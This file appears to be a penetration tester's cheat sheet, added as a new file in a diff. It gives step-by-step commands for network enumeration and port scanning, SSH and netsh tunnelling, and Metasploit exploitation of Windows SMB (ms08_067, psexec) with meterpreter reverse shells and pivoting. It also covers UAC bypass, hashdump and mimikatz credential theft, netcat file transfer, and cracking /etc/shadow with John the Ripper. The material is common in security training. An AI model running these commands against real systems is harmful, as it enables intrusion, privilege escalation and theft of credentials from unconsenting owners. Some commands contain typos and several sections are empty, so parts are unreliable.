@@ -1,0 +1,267 @@
+
+1‐ script: 
+#> script ‐af name.it.something.txt
+
+
+2-‐ Enumeration & Discovery: WINDOWS & some linux:
+
+systeminfo	
+netstat ‐ano | findstr "ESTABLISHED" 
+dir /a /s filename.ext	
+net use route print	
+tasklist /svc *check for AV*	
+net view tracert
+arp ‐a
+net use * \\HN\share
+reg query (HKLM/software)	
+net share
+# linux: locate <file> (sudo updatedb)	
+# linux: find / | grep shadow	
+# linux: sudo find / ‐name shadow	
+
+netsh firewall show allprofiles state
+# netsh firewall show config	
+user #> domain\user
+pass #> password
+# ipconfig /all	
+ 
+‐*Find any new servers?*‐
+
+(start,step,stop)
+#> for /L %i in (1,1,255) do @ping ‐n 1 192.168.1.% | find "TTL"
+‐ Linux typically 64 or less | Windows typically 128
+
+‐ Windows XP CLI ‐ port scan: 1‐1024
+#> for /L %i in (1,1,1024) do @((netsh diag connect iphost 192.168.1.100%i)&(echo quit))
+
+‐ Windows Vista CLI ‐ port scan: 1‐1024
+#> 1..1024 | % {echo ((new‐object Net.Sockets.TcpClient).Connect("192.168.1.100",$_))"$_is open"} 2>null
+
+Linux bash: (scan 10.0.0.1:1‐446)
+#> for i in {1..446}; do echo >/dev/tcp/10.0.0.1/$i && echo $i open; done 2>/dev/null
+
+*NMAP
+#> nmap ‐sn ‐n <IP_range>			#1 ‐ (ping sweep)
+#> nmap ‐sV ‐Pn ‐n [‐T5] <IP|IP_range>		#2/#3 (in background) (GO FAST | no DNS ‐ saves time) 
+#> nmap ‐sV ‐n ‐P0 <IP|IP_range>		#4 (service/port scan)
+
+‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐
+‐ Windows OS Discovery:
+#> use auxiliary/scanner/smb/smb_version 
+	#> set RHOSTS <target_IP>
+	#> run ‐ gather: OS type; Hostname; domain
+
+3‐ SSH & Tunneling: (basics)-- 
+SSH using 62201 instead of 22:
+	#> ssh user@<IP.ADDR> ‐p 62201
+Forward SSH Tunneling:
+@kali_#> ssh user@<IP.ADDR> ‐L 9000:imgur.com:80
+‐ if imgur was blocked by my FW; I can use an outside svr <user@IP.ADDR> to view imgur.com:80 via kali(127.0.0.1:9000) @kali_#> ssh user@<IP.ADDR> ‐NfL 9000:imgur.com:80
+‐ same as above, but NO CMD prompt, and runs in the background
+
+Reverse SSh Tunneling:
+#> ssh user@10.0.0.6> ‐R 9001:192.39.0.7:80
+‐ Whoever connects to 10.0.0.6:9001 will be tunneled through my private network to 192.39.0.7:80
+
+
+
+
+
+4	‐ Redirect Metasploit via Tunneling:	
+
+
+Payload INFO:
+‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐
+RHOST & RPORT = From start (Kali) ‐ TO THE TARGET
+‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐
+redirector:fwd‐back‐home
+‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐
+ 
+	  ============================================================================
+‐‐‐‐‐‐‐‐|	    ***** Exploit Win netapi (or PSexec) through LINUX *****	      |‐‐‐‐‐‐‐‐
+	  ============================================================================
+‐ requires username and password of Ubuntu:
+		*requirement: add "GatewayPorts yes" to /etc/ssh/sshd_config*
+@Kali:
+
+#> ssh username@10.0.0.130 ‐L 5445:10.0.0.80:445 ‐R 8080:0.0.0.0:8080
+
+_________           __________           _________
+| 5445‐>*|‐‐‐‐‐>22‐|‐‐‐‐‐‐‐‐\ |	   	    |	        |
+|	       |	       |	       *>‐‐‐‐‐‐‐‐>|445	    |		
+| Kali	 |	       |	        |		      | ^/      |
+|_______8080<‐‐‐‐‐‐|*‐‐‐‐‐8080|<‐‐‐‐‐‐‐ |*/	      |
+10.0.0.110	       | UBUNTU   |	 	      |Win Tgt  |
+		               |__________|		      |_________|
+		                10.0.0.130		        10.0.0.80
+
+
+
+
+@Kali:
+‐msfconsole ‐ Win‐XP | ms08_067_netapi
+#> use exploit/windows/smb/ms08_067_netapi
+#> set payload windows/meterpreter/reverse_tcp
+#> set rhost 127.0.0.1	(from kali ‐to‐ redirector:forwarded to TARGET)
+#> set rport 5445	(from kali ‐to‐ redirector:forwarded to TARGET)
+#> set lhost 10.0.0.130	(from TARGET ‐to‐ redirector:forwarded home)
+#> set lport 8080	(from TARGET ‐to‐ redirector:forwarded home) #> set target <SMB_VER_scan:show‐targets>
+#> run
+
+‐msfconsole ‐ Win‐7 | PsExec
+#> use exploit/windows/smb/psexec
+#> set payload windows/meterpreter/reverse_tcp
+‐‐‐‐‐‐‐‐‐‐‐‐‐ * If routing through session * ‐‐‐‐‐‐‐‐‐‐‐‐‐
+#> set payload windows/meterpreter/bind_tcp
+#‐‐ If using PsExec going windows to Windows USE BIND_TCP
+
+	 ============================================================================
+‐‐‐‐‐‐‐‐|	 ***** Exploit Win netapi (or PSexec) through Windows *****	    |‐‐‐‐‐‐‐‐
+ 	 ============================================================================
+‐ requires current shell on Windows7
+
+*	when using portproxies; we set RPORT/RHOST to the redirector *
+*	best for getting to your first target ‐‐ OTHERWISE: PIVOT *
+
+From Windows 7 (redirector):
+#> netsh interface portproxy add v4tov4 listenport=2929 listenaddress=0.0.0.0 connectport=445 connectaddress=10.0.0.80 
+#> netsh interface portporxy add v4tov4 listenport=3939 listenaddress=0.0.0.0 connectport=3939 connectaddress=10.0.0.110
+
+	__________ 	         __________		              ___________
+	|	      *|‐‐‐‐‐‐>2929|‐‐‐‐‐‐‐>*|‐‐‐‐‐‐‐‐‐‐‐‐‐-->|445	    |
+	| Kali	 |	         |  Win7   |		            |^/	      |
+	|________<‐3939‐‐‐‐‐‐|*<‐‐‐‐‐3939<‐‐‐‐‐‐‐‐‐‐‐‐--|*	      |
+	10.0.0.110	         |_________|		            | Win tgt |
+				                   .50                    |_________|
+					 		                                        .80
+@Kali:		
+‐msfconsole ‐ Win‐XP | ms08_067_netapi
+#> use exploit/windows/smb/ms08_067_netapi
+#> set payload windows/meterpreter/reverse_tcp * USE BIND_TCP IF IN A ROUTE * #> set rhost 10.0.0.50
+#> set rport 2929
+#> set lhost 10.0.0.50 #> set lport 3939
+#> set target <SMB_VER_scan:show‐targets>
+
+‐msfconsole ‐ Win‐7 | PsExec
+#> use exploit/windows/smb/psexec
+#> set payload windows/meterpreter/reverse_tcp
+‐‐‐‐‐‐‐‐‐‐‐‐‐ * If routing through session * ‐‐‐‐‐‐‐‐‐‐‐‐‐
+#> set payload windows/meterpreter/bind_tcp	* USE BIND_TCP IF IN A ROUTE *
+‐ if on domain: you need SMBDomain / SMBUser / SMBPass
+
+
+
+
+
+‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐
+ 
+Pivot through a Windows‐7
+‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐
+				
+			  	                            __________
+ 	__________		             _______//^-PIVOT   \\
+ 	|	        | 		          |	        |         \\_________	
+	|	       *|‐‐‐‐‐‐‐‐‐‐‐‐‐->| WinXP   |	        | win_svr |
+	|  Kali   |		            |_________|	        |         |
+	|_________|               10.0.0.50	          |_________|
+   10.0.0.110				                        Target: 192.39.0.40
+
+
+From msfconsole:
+‐ After discovery of new network; (i.e., ipconfig /all) "192.39.0.40"
+‐ (Background current session) msfconsole>
+#> route add 192.39.0.0 255.255.255.0 <session#>
+#> route get 192.39.0.40	(results should display session #) #> use exploit/windows/smb/psexec
+‐ Because this instance goes from Windows to Windows
+#> set payload windows/meterpreter/bind_tcp #> show options
+#> set rhost 192.39.0.40
+#> set SMBDomain "x"	(stolen from MimiKatz / found in smb_version scan) #> set SMBUser "x"	(mimikatz/John‐The‐Ripper)
+#> set SMBPass "x"	(mimikatz/John‐The‐Ripper)
+
+
+
+5	‐ EXPLOITATION ON TARGET:	
+
+‐ *See Meterpreter cheat sheet*
+
+‐ make sure you're on the right box #> ifconfig
+
+‐ If no meterpreter *upgrade*
+#> sessions ‐u <#>	(session number)
+If that doesn't work...
+#> Ctrl+Z	(back‐out)
+#> search uac
+#> use exploit/windows/local/bypass UAC #> show options
+#> set session #
+#> exploit	(sploit)
+
+‐ METERPRETER COMMANDS
+#> For Meterpreter commands: enter [?]
+#> getuid	(privileges)
+#> getsystem	(SYSTEM priv accounts)
+#> sysinfo	(systeminfo)
+#> getpid	(processes)
+#> idletime	(active users? ‐ relative to privilege level)
+#> getpid ‐ *look for explorer*	(evidence of active user)
+#> search ‐f <calc*>	(find calculator)
+#> hashdump	(only works on Windows)
+#> migrate <sys‐level_SVC_host PID>
+‐ post exploitation scripts:
+/usr/share/metasploit‐framework/scripts/meterpreter	(kali)
+/apps/pro/msf3/scripts/meterpreter	(backtrack)
+
+‐ Migrate Meterpreter to a SYSTEM level SVCHOST #> shell
+#> execute ‐f cmd.exe ‐i ‐H
+‐FROM COMMAND PROMPT: Refer to Windows Cheat sheet
+#> secedit	(security products)
+#> auditpol	(security info) #> copy C:/program files	(programs)
+
+‐ If I get creds from mimkatz; they're not domain creds from DC (but may be reused) (Pg.39) *migrate to SVCHOST*
+
+
+‐‐‐‐‐‐‐‐ msfvenom ‐‐‐‐‐‐‐‐
+
+
+‐‐‐‐‐‐‐‐ psExec ‐‐‐‐‐‐‐
+
+Found new domain? (try usernames/passwords youve seen on other accounts) #> use exploit/windows/smb/psexec
+ 
+#>
+
+
+6‐ Transferring Files:	
+
+Netcat to transfer to/from Windows
+‐ Windows:	#> nc ‐l ‐p <port> > "My_New_File.exe"
+‐ Linux:	#> nc ‐w3 <Windows_IP> <port> < "Send_This_File.exe"
+
+Upload from Meterpreter:
+#> upload /path/to/SOURCE.txt C:/path/to/destination
+#> upload \\path\\to\\SOURCE.txt C:\\path\\to\\destination 
+#> download C:/path/to/source /root/desktop
+#> download C:\\path\\to\\source \\root\\desktop
+
+Check hashes:
+‐ Linux:	#> md5sum "file" 
+		#> sha1sum "file"
+‐ Windows:	#> certutil ‐hashfile "file" MD5
+		#> certutil ‐hashfile "file" SHA1
+
+
+7‐ PassWord STEALING:	
+
+@Kali ‐ meterpreter:
+#> load mimikatz #> wdigest
+‐ *look for domain creds*
+
+
+‐ JOHN THE RIPPER ‐ (for Windows)
+‐ From Meterpreter:
+#> hashdump	‐or‐	#> run hashdump
+‐ (if passwords more than 15 characters) ‐‐ reasonable assumption ‐‐
+#> john ‐‐format=nt <hashdumpfile> #> john <hashdumpfile>
+
+‐ JOHN THE RIPPER ‐ (for Linux)
+‐ copy /etc/shadow & /etc/passwd
+‐ touch etcshadow.txt & etcpasswd.txt
+etcpasswd.txt etcshadow.txt > ForJTR.txt #> john ForJTR.txt
